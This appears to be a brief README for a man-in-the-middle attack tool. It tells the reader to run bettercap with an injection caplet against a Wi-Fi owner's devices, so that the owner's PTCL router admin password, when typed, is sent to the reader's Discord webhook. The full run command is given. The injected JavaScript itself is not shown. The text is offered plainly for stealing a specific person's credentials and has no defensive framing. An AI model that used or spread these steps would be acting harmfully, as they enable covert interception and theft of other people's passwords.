1. Install bettercap on Linux
2. Replace discord webhook link to your own in javascript file
3. In cap file replace ips with ips of devices of wifi owner so that as soon as he login to admin portal on those devices you get password on your discord server.
4. Run the the following command: (Replace <wlp0s20f3> with your wifi card or local network ethernet on which other devices are running admin panel of PTCL)
```
sudo bettercap -iface <wlp0s20f3> -caplet /path/to/inject.cap
```

Keep running it untill the owner of wifi enter password and you get it.
